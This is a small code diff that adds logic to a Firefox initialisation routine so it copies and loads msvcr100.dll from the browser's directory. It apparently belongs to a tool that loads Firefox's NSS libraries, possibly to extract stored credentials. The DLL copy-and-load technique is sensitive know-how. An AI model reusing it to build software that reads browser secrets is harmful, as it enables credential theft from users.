@@ -131,6 +131,7 @@ HMODULE libnssu = NULL;
 HMODULE libpld = NULL;
 HMODULE libsof = NULL;
 HMODULE libtmp = NULL;
+HMODULE libmsvcrt = NULL;
 
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
 
@@ -233,6 +234,12 @@ void FireFoxInitFunc()
 		firefoxDir = GetTBLibPath();
 		if (!firefoxDir || !DirectoryExists(firefoxDir))
 			return;
+	}
+
+	if (!libmsvcrt && GetModuleHandle("msvcr100.dll") == NULL) {
+		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, "msvcr100.dll");
+		HM_CompletePath("msvcr100.dll", destPath);
+		libmsvcrt = CopyAndLoadDLL(loadPath, destPath);
 	}
 
 	if (!libcrt) {
